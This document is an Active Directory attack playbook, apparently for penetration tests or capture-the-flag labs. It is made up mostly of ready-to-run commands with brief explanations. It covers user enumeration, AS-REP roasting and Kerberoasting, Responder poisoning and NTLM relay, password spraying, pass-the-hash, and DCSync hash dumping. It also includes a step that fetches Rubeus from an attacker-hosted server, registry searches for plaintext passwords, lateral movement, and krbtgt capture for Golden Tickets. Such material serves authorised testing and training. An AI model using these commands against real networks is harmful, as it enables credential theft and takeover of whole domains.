# Active Directory Methodology

## 1. Initial Enumeration (Unauthenticated)

```bash
# 1. SMB fingerprint — hostname, domain, OS, signing
nxc smb <TARGET-IP>

# 2. Deep enum — users via RID cycling, shares, groups
enum4linux-ng -A <TARGET-IP> -oA results

# 3. Full port scan
nmap -sC -sV -Pn -p- -vv <TARGET-IP> -oA initial
```

Update `/etc/hosts` before going further:
```
<DC-IP>  domain.local  dc01.domain.local  DC01
```

## 2. User Enumeration

### LDAP Anonymous Bind
```bash
# Test if anonymous bind is enabled
ldapsearch -x -H ldap://<DC-IP> -s base

# If enabled, dump users
ldapsearch -x -H ldap://<DC-IP> -b "dc=<domain>,dc=<tld>" "(objectClass=person)"
```

### RPC Null Session
```bash
# Connect anonymously
rpcclient -U "" <DC-IP> -N

# Once in the shell:
enumdomusers       # list all users
enumdomgroups      # list all groups
help               # see all available commands
```

If `enumdomusers` is restricted, fall back to RID cycling:
```bash
for i in $(seq 500 2000); do echo "queryuser $i" | rpcclient -U "" -N <DC-IP> 2>/dev/null | grep -i "User Name"; done
```

### enum4linux-ng (automated, all of the above + more)
```bash
enum4linux-ng -A <DC-IP> -oA results
# -A: all checks (users, groups, shares, password policy, OS info, NetBIOS)
# -oA: saves output to results.json and results.yaml
```

### Kerbrute — Validate Gathered Usernames
Use usernames from rpcclient/enum4linux-ng to confirm active AD accounts via Kerberos (no lockout risk):
```bash
# Validate a gathered list
kerbrute userenum --dc <DC-IP> -d <domain> users.txt

# Or enumerate from scratch with a wordlist
kerbrute userenum --dc <DC-IP> -d <domain> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

Kerbrute filters out disabled, honeypot, and non-domain accounts — use its output as the final `users.txt` for password spraying.

### RID cycling via nxc (quick alternative)
```bash
nxc smb <TARGET-IP> -u '' -p '' --rid-brute
```

## 3. Unauthenticated Attacks

### AS-REP Roasting (no pre-auth required)

Unlike Kerberoasting, the target accounts don't need to be service accounts — any account with the `UF_DONT_REQUIRE_PREAUTH` flag set is vulnerable. Normally Kerberos requires the client to encrypt a timestamp with their hash to prove identity before the KDC responds. When pre-auth is disabled the KDC skips that check and returns an encrypted AS-REP blob to anyone who asks — that blob can be cracked offline to recover the plaintext password.

```bash
# Phase 1: collect hashes for any vulnerable accounts in users.txt
GetNPUsers.py <domain>/ -no-pass -usersfile users.txt -dc-ip <DC-IP> -format hashcat -outputfile hashes.txt

# Phase 2: crack offline (mode 18200 = Kerberos 5 AS-REP etype 23)
hashcat -m 18200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

Accounts without the flag produce `[-] User X doesn't have UF_DONT_REQUIRE_PREAUTH set`; vulnerable ones emit the `$krb5asrep$23$` hash line into `hashes.txt`.

**If you have a foothold on a Windows box (Rubeus):**
```powershell
# Run on the Windows target — queries AD directly, no user list needed
.\Rubeus.exe asreproast
```
If Rubeus isn't pre-installed, upload it from your Linux box:
```bash
# Start a Python HTTP server on your attack box
python3 -m http.server 8080

# On the Windows target (PowerShell):
# Invoke-WebRequest -Uri http://<YOUR-IP>:8080/Rubeus.exe -OutFile Rubeus.exe
```
Output is the raw `$krb5asrep$23$` hash — copy it to your Linux box and crack with hashcat as above.

### Anonymous / Guest SMB Access
```bash
# List shares
smbclient -L //<TARGET-IP> -N

# Show READ/WRITE permissions per share at a glance
smbmap -H <TARGET-IP>

# Nmap alternative (good for scripted output)
nmap -p 445 --script smb-enum-shares <TARGET-IP>

# Connect to a share anonymously
smbclient //<TARGET-IP>/<share> -N
# With credentials:
smbclient //<TARGET-IP>/<share> -U 'username%password'
```

Once connected:
```
ls              # list files
recurse on      # recursive listing (shows subdirs)
get <file>      # download a file
```

Target non-standard shares (anything not `ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`) with READ/WRITE access. Hunt for: config files, scripts, backups, cleartext credentials.

### LLMNR/NBT-NS Poisoning (Responder)
```bash
# Ensure UFW allows 445/tcp first
responder -I tun0 -wv
# Crack captured NTLMv2 hash (mode 5600 = NTLMv2):
hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

### NTLM Relay (when cracking fails)

When a captured NTLMv2 hash won't crack, relay it instead. Rather than capturing and cracking, `ntlmrelayx.py` forwards the authentication in real-time to another machine — if the victim has local admin on the target, you get SAM hashes or a shell with no password required.

**Prerequisite:** SMB signing must be disabled on the target. Check signing status from your initial `nxc smb` scan — this is why it matters.

```bash
# Phase 1: find hosts with SMB signing disabled → relay targets
nxc smb <SUBNET>/24 --gen-relay-list targets.txt

# Phase 2: disable SMB and HTTP in Responder so it poisons but doesn't respond
# Edit /home/max/tools/Responder/Responder.conf:
#   SMB = Off
#   HTTP = Off

# Phase 3: start the relay (default action dumps SAM hashes from each target)
ntlmrelayx.py -tf targets.txt -smb2support

# Phase 3 (interactive shell instead):
ntlmrelayx.py -tf targets.txt -smb2support -i

# Phase 4: run Responder to trigger victim authentication
responder -I tun0 -wv
```

Successful relay dumps SAM hashes from the target — crack or PTH from there.

## 4. Authenticated Enumeration

```bash
# Validate creds
nxc smb <DC-IP> -u <user> -p <password>

# Enumerate shares
smbclient -L //<TARGET-IP> -U <user>%<password>
nxc smb <DC-IP> -u <user> -p <password> --shares
```

### PowerShell — ActiveDirectory Module (on the Windows box)
```powershell
Import-Module ActiveDirectory

# Users
Get-ADUser -Filter *                                                        # all users
Get-ADUser -Identity <username> -Properties LastLogonDate,MemberOf,Description,Title,PwdLastSet
Get-ADUser -Filter "Name -like '*admin*'"                                   # filter by name

# Groups
Get-ADGroup -Filter * | Select Name                                         # all groups
Get-ADGroupMember -Identity "Domain Admins"                                 # members of a group

# Computers
Get-ADComputer -Filter * | Select Name, OperatingSystem

# Password policy
Get-ADDefaultDomainPasswordPolicy
```

### PowerView (on the Windows box)
PowerView lives at `~/tools/windows/PowerView.ps1` — upload it to the target then:
```powershell
Import-Module .\PowerView.ps1

Get-DomainUser                          # all domain users (richer output than net user)
Get-DomainUser *admin*                  # filter by name
Get-DomainUser -AdminCount              # users with admin privileges
Get-DomainUser -SPN                     # accounts with SPNs set → Kerberoasting candidates

Get-DomainGroup "*admin*"               # groups matching filter (shows members inline)
Get-DomainComputer                      # all domain computers with full detail
```

### BloodHound collection
```bash
# From Linux (no foothold needed)
bloodhound-python -u <user> -p <password> -d <domain> -ns <DC-IP> -c All --zip

# From a Windows foothold (SharpHound — may trigger AV)
.\SharpHound.exe --CollectionMethods All --Domain <domain> --ExcludeDCs

# Import the ZIP into BloodHound-CE, then:
# - Cypher → folder icon → run built-in queries (e.g. "All Domain Admins")
# - Pathfinding → set Start Node and End Node → visualise attack path
```

## 5. Authenticated Attacks

### Kerberoasting

Any authenticated domain user can request a TGS (service ticket) for any account that has a SPN set — that's by design in Kerberos. The KDC encrypts part of that ticket with the service account's NTLM hash. You take the ticket offline and crack it. Service accounts with SPNs often have weak passwords and elevated privileges, making them high-value targets.

```bash
# Phase 1: enumerate kerberoastable accounts (no tickets requested yet)
GetUserSPNs.py <domain>/<user>:<password> -dc-ip <DC-IP>

# Phase 2: request tickets for all kerberoastable accounts
GetUserSPNs.py <domain>/<user>:<password> -dc-ip <DC-IP> -request -outputfile hashes.txt

# Phase 3: crack offline (mode 13100 = Kerberos 5 TGS-REP etype 23)
hashcat -m 13100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

Accounts without SPNs are skipped automatically. Hash prefix is `$krb5tgs$23$`.

**If you have a foothold on a Windows box (Rubeus):**
```powershell
.\Rubeus.exe kerberoast /outfile:hashes.txt
```
Copy `hashes.txt` to your Linux box and crack with hashcat as above.

### Password Spray (careful — lockout risk)

**Always check the password policy first** — never spray blind.

```bash
# Option 1: rpcclient
rpcclient -U "" <DC-IP> -N -c "getdompwinfo"

# Option 2: nxc
nxc smb <DC-IP> --pass-pol
```

Key values to note before spraying:
- **Account Lockout Threshold** — max failed attempts before lockout (stay well under this)
- **Reset Account Lockout Counter** — how long before the counter resets (wait this long between spray rounds)
- **Password Complexity** — informs which passwords to try (uppercase + lowercase + digit + special)

```bash
# Spray a single password across all users (safest)
nxc smb <TARGET-IP> -u users.txt -p 'Password1!' --continue-on-success

# Spray multiple passwords (riskier — watch the lockout threshold)
nxc smb <TARGET-IP> -u users.txt -p passwords.txt --continue-on-success
```

`[+]` in output = valid credential found. Target workstations (`WRK`) as well as the DC — domain creds work on both.

### Pass-the-Hash
```bash
nxc smb <TARGET-IP> -u <user> -H <NTLM-hash>
psexec.py <domain>/<user>@<TARGET-IP> -hashes :<NTLM-hash>
evil-winrm -i <TARGET-IP> -u <user> -H <NTLM-hash>
```

### DCSync (if DA or replication rights)
```bash
secretsdump.py <domain>/<user>:<password>@<DC-IP>
# Dumps all NTLM hashes — crack or PTH for any account
```

## 6. Post-Foothold Enumeration (on the Windows box)

### Who am I?
```cmd
whoami                          # domain\username — confirms domain vs local account
whoami /all                     # SID, group memberships, and privileges
```

Key privileges to flag immediately:
- `SeImpersonatePrivilege` — potato attacks (PrintSpoofer, GodPotato) → SYSTEM
- `SeAssignPrimaryTokenPrivilege` — used alongside SeImpersonate
- `SeBackupPrivilege` — read any file regardless of ACL → dump SAM/SYSTEM hive
- `SeRestorePrivilege` — write any file/registry key → overwrite critical files
- `SeDebugPrivilege` — attach debugger to any process → dump LSASS, inject code

### Where am I?
```cmd
hostname                                           # machine name (dc/wrk hints at role)
systeminfo | findstr /B "OS"                       # OS version
systeminfo | findstr /B "Domain"                   # domain membership
set                                                # all env vars (USERDOMAIN, paths, installed software hints)
```
In PowerShell use `Get-ChildItem Env:` or `dir env:` instead of `set`.

### Domain users and groups
```cmd
net user /domain                                   # all domain users
net user <username> /domain                        # detail on a specific user (groups, last logon, pw expiry)
net group /domain                                  # all domain groups
net group "Domain Admins" /domain                  # members of a specific group
net group "Domain Computers" /domain               # all machine accounts (end with $)
net localgroup                                     # local groups on this machine
net localgroup administrators                      # who has local admin here
```

### Who else is logged on?
```cmd
quser                                              # active sessions (console vs RDP, idle time)
tasklist /V                                        # running processes with owner (needs admin)
net session                                        # open SMB sessions (needs admin)
dir C:\Users\                                      # every user who has logged on at least once
```
A logged-on admin session = high-value target: attempt token impersonation or LSASS dump.

### Service accounts
```cmd
wmic service get Name,StartName                    # service name + account it runs as (needs admin)
sc query state= all                                # all services
sc query state= all | find "<keyword>"             # filter by keyword
sc qc <ServiceName>                                # detail on a specific service (shows SERVICE_START_NAME)
```
In PowerShell: `Get-WmiObject Win32_Service | select Name, StartName`

Flag any service running as a domain account (`DOMAIN\username`) — may have reused or weak password, and domain service accounts are Kerberoastable.

### Registry — quick wins
```cmd
# Auto-logon credentials (plaintext if set)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# Installed applications (hunt for known default creds)
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall

# Search entire registry for keyword (slow but thorough)
reg query HKLM /f "password" /t REG_SZ /s
```

### Scheduled tasks
```cmd
schtasks /query                                    # list all scheduled tasks
```

## 7. Lateral Movement

```bash
# WinRM (port 5985)
evil-winrm -i <TARGET-IP> -u <user> -p <password>

# PSExec (requires admin share access)
psexec.py <domain>/<user>:<password>@<TARGET-IP>

# WMIExec (stealthier than psexec, no service install)
wmiexec.py <domain>/<user>:<password>@<TARGET-IP>
```

## 8. Privilege Escalation Paths (check in BloodHound)

- **GenericAll / GenericWrite** on a user → reset their password
- **WriteDACL** on a group → add yourself
- **DCSync rights** → dump all hashes
- **Unconstrained delegation** → capture TGTs
- **ACL abuse** → ForceChangePassword, AddMember

## 9. Domain Compromise Checklist

- [ ] DA hash / plaintext obtained
- [ ] `secretsdump.py` run against DC
- [ ] krbtgt hash captured (enables Golden Ticket)
- [ ] All flags/proof.txt collected
